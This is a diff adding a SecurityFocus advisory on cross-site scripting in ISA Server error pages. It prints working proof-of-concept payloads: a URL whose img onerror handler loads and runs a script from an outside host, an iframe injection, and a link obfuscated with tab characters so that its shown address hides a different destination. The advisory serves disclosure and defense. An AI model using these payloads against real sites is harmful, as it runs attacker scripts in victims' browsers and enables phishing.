@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8207/info
+
+ISA server will output certain error pages when requests that are invalid, for whatever reason, are transmitted through it. These error pages will appear in the context of the domain that the request was made for. It has been reported that many of these error pages contain cross-site scripting vulnerabilities that allow for the execution of script code (embedded in the request URI) in the context of client requested domains.
+
+The following proof-of-concept was provided:
+http://<img%09src=""%09onerror="document.scripts[0].src=%27http%5Cx3a%5Cx2f%5Cx2fjscript.dk%5Cx2ftest.js%27;">script@YOUR.TLD/%U0
+
+The above proof-of-concept will include and execute http://jscript.dk/test.js on YOUR.TLD, this is provided that YOUR.TLD is protected by an ISA Server installation.
+
+*http://<iframe>:test@[site]/test
+
+The exploit provided for BID 4486 will also reportedly work for this vulnerability.
+
+An additional proof-of-concept was supplied by "http-equiv@excite.com" <1@malware.com> that demonstrates a true status and a false destination:
+<A href="http://www.example.com%09%09%09@%09%09%09%09%09%09
+09www.malware.com">http://www.example.com</A>
